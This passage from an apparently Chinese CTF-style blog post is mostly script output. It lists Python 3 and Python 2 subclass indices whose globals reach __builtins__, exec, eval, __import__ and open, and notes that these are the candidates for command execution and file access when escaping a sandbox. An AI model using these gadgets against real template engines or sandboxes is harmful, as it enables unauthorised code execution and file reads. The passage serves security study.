&#39;_frozen_importlib._ModuleLockManager&#39;&gt; sys None</span><br><span class="line">78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __builtins__ None</span><br><span class="line">78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__ None</span><br><span class="line">78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; sys None</span><br><span class="line">79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __builtins__ None</span><br><span class="line">79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__ None</span><br><span class="line">79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; sys None</span><br><span class="line">91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __builtins__ None</span><br><span class="line">91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; sys None</span><br><span class="line">92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __builtins__ None</span><br><span class="line">92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; sys None</span><br><span class="line">93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __builtins__ None</span><br><span class="line">93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; sys None</span><br><span class="line">95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __builtins__ None</span><br><span class="line">95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; sys None</span><br><span class="line">103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __builtins__ None</span><br><span class="line">103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; sys None</span><br><span class="line">103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None</span><br><span class="line">104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __builtins__ None</span><br><span class="line">104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; sys None</span><br><span class="line">104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None</span><br><span class="line">105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __builtins__ None</span><br><span class="line">105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; sys None</span><br><span class="line">105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None</span><br><span class="line">106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __builtins__ None</span><br><span class="line">106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; sys None</span><br><span class="line">106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None</span><br><span class="line">128 &lt;class &#39;os._wrap_close&#39;&gt; __builtins__ None</span><br><span class="line">128 &lt;class &#39;os._wrap_close&#39;&gt; sys None</span><br><span class="line">128 &lt;class &#39;os._wrap_close&#39;&gt; open None</span><br><span class="line">129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __builtins__ None</span><br><span class="line">129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; sys None</span><br><span class="line">130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __builtins__ None</span><br><span class="line">130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; sys None</span><br><span class="line">137 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __builtins__ None</span><br><span class="line">138 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __builtins__ None</span><br><span class="line">139 &lt;class &#39;warnings.WarningMessage&#39;&gt; __builtins__ None</span><br><span class="line">139 &lt;class &#39;warnings.WarningMessage&#39;&gt; sys None</span><br><span class="line">140 &lt;class &#39;warnings.catch_warnings&#39;&gt; __builtins__ None</span><br><span class="line">140 &lt;class &#39;warnings.catch_warnings&#39;&gt; sys None</span><br><span class="line">167 &lt;class &#39;reprlib.Repr&#39;&gt; __builtins__ None</span><br><span class="line">174 &lt;class &#39;functools.partialmethod&#39;&gt; __builtins__ None</span><br><span class="line">176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __builtins__ None</span><br><span class="line">176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; sys None</span><br><span class="line">177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __builtins__ None</span><br><span class="line">177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; sys None</span><br><span class="line">----------3-----------</span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec</span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; eval</span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; compile</span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__</span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open</span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec</span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; eval</span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; compile</span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__</span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open</span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec</span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; eval</span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; compile</span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__</span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open</span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec</span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; eval</span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; compile</span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__</span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open</span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec</span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; eval</span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; compile</span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__</span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open</span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec</span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; eval</span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; compile</span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __import__</span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; eval</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; compile</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __import__</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; eval</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; compile</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __import__</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; eval</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; compile</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __import__</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open</span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec</span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; eval</span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; compile</span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __import__</span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open</span><br><span class="line">103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open</span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec</span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; eval</span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; compile</span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __import__</span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open</span><br><span class="line">104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open</span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec</span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; eval</span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; compile</span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __import__</span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open</span><br><span class="line">105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open</span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec</span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; eval</span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; compile</span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __import__</span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open</span><br><span class="line">106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open</span><br><span class="line">128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec</span><br><span class="line">128 1 &lt;class &#39;os._wrap_close&#39;&gt; file</span><br><span class="line">128 1 &lt;class &#39;os._wrap_close&#39;&gt; open</span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec</span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; eval</span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; compile</span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; __import__</span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; open</span><br><span class="line">128 11 &lt;class &#39;os._wrap_close&#39;&gt; open</span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec</span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; eval</span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; compile</span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __import__</span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open</span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec</span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; eval</span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; compile</span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __import__</span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open</span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec</span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; eval</span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; compile</span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __import__</span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open</span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec</span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; eval</span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; compile</span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __import__</span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open</span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec</span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; eval</span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; compile</span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; __import__</span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open</span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec</span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; eval</span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; compile</span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; __import__</span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open</span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec</span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; eval</span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; compile</span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; __import__</span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open</span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec</span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; eval</span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; compile</span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; __import__</span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; eval</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; compile</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __import__</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; eval</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; compile</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __import__</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open</span><br><span class="line">----------4-----------</span><br><span class="line">140 exec</span><br><span class="line">140 eval</span><br><span class="line">140 compile</span><br><span class="line">140 __import__</span><br><span class="line">140 open</span><br><span class="line">筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上</span><br><span class="line"></span><br><span class="line">----------2-----------                                      </span><br><span class="line">103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None           </span><br><span class="line">104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None           </span><br><span class="line">105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None           </span><br><span class="line">106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None                </span><br><span class="line">128 &lt;class &#39;os._wrap_close&#39;&gt; open None                      </span><br><span class="line">----------3-----------                                      </span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open           </span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec           </span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open      </span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec      </span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open    </span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec    </span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open     </span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec     </span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open            </span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec            </span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open   </span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec   </span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open   </span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec   </span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open              </span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec              </span><br><span class="line">103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open             </span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open              </span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec              </span><br><span class="line">104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open             </span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open              </span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec              </span><br><span class="line">105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open             </span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                   </span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec                   </span><br><span class="line">106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                  </span><br><span class="line">128 1 &lt;class &#39;os._wrap_close&#39;&gt; open                         </span><br><span class="line">128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec                         </span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; open                         </span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec                         </span><br><span class="line">128 11 &lt;class &#39;os._wrap_close&#39;&gt; open                        </span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open                  </span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec                  </span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open                 </span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec                 </span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open            </span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec            </span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open                </span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec                </span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open                </span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec                </span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open                </span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec                </span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open                           </span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec                           </span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open                </span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec                </span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open              </span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec              </span><br><span class="line">----------4-----------                                      </span><br><span class="line">140 open                                                    </span><br><span class="line">140 exec      </span><br></pre></td></tr></table></figure>

<h4 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----------1-----------</span><br><span class="line">(40, &#39;file&#39;)</span><br><span class="line">----------2-----------</span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])</span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])</span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])</span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])</span><br><span class="line">(61, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(62, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])</span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])</span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])</span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])</span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)</span><br><span class="line">(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)</span><br><span class="line">----------3-----------</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, 